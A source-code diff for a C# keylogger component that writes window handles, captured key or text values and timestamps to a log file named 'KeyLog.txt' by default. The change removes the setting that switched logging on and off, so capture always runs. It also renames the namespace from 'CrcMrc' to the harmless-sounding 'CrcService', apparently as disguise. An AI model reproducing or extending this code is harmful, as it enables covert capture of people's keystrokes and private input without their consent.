@@ -11,7 +11,7 @@ using System.Runtime.InteropServices;
 using System.Threading;
 using System.IO;
 
-namespace CrcMrc
+namespace CrcService
 {
     class common
     {
@@ -34,14 +34,10 @@ namespace CrcMrc
             iCount = 0;            
             String path = @"KeyLog.txt";
             path = Properties.Settings.Default.FileName;
-
-            if (CrcMrc.Properties.Settings.Default.Log_KeyLogger)
+            if (!File.Exists(path))
             {
-                if (!File.Exists(path))
+                using (StreamWriter sw = File.CreateText(path))
                 {
-                    using (StreamWriter sw = File.CreateText(path))
-                    {
-                    }
                 }
             }
 
@@ -67,8 +63,7 @@ namespace CrcMrc
                         text = converter.ConvertToString(i);
                         using (StreamWriter sw = File.AppendText(path))
                         {
-                            if (CrcMrc.Properties.Settings.Default.Log_KeyLogger)
-                                sw.WriteLine(hwnd.ToString().PadRight(15) +  text.PadRight(20) + "@ " + DateTime.Now.ToString());
+                            sw.WriteLine(hwnd.ToString().PadRight(15) +  text.PadRight(20) + "@ " + DateTime.Now.ToString() );
                             Array.Resize(ref iHwnd, iHwnd.Length + 1);
                             iHwnd.SetValue(hwnd, iHwnd.Length-1);
                         }
